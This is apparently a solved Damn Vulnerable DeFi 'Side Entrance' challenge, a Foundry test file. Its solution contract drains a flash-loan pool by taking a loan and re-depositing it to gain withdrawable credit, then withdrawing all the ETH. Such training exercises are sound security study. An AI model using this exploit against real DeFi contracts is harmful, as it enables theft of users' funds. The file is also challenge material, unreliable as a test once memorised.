// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Create exploiter contract
        SideEntranceExploiter exploiter = new SideEntranceExploiter(
            address(pool)
        );

        // Execute the attack
        exploiter.attack();

        // Withdraw the ETH to the recovery address
        exploiter.withdrawToRecovery(recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(
            recovery.balance,
            ETHER_IN_POOL,
            "Not enough ETH in recovery account"
        );
    }
}

// Our exploitation contract, which will use the vulnerability of side entrance
contract SideEntranceExploiter {
    SideEntranceLenderPool private immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    // Main attack function
    function attack() external {
        // 1. Request a flash loan for all ETH in the pool
        pool.flashLoan(address(pool).balance);
    }

    // This function is called by the pool during the flash loan execution
    function execute() external payable {
        // 2. Instead of directly returning the ETH, deposit it back
        // This satisfies the flash loan check while crediting our balance
        pool.deposit{value: msg.value}();
    }

    // After the attack, withdraw and send to recovery address
    function withdrawToRecovery(address recovery) external {
        // 3. Withdraw all ETH based on our credited balance
        pool.withdraw();

        // 4. Send the drained ETH to the recovery address
        payable(recovery).transfer(address(this).balance);
    }

    // Required to receive ETH
    receive() external payable {}
}
